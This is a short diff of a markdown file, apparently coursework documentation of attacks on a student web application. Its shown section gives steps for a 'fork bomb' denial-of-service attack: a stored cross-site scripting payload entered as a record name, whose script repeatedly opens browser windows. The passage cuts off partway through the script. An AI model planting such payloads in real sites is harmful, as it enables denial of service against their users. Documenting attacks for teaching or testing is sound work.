@@ -37,7 +37,8 @@
 ### Distributed Denial of Service (DDoS) Attack
 **Fork Bomb:**
 1. Make sure that the browser with the site open will not block popups
-2. Add a new record, using the following as the value for the record name (replace the URL with the current account URL):
+2. Add a new record, using the following as the value for the record name:
+*  (CHANGE FORMAT SO RAW IS DISPLAYED INSTEAD OF FORMATTED)
 >"&amp;gt;<script>
 function fork() {
   	const win = window.open("http://flip3.engr.oregonstate.edu:6061/user/Kyle&12345");
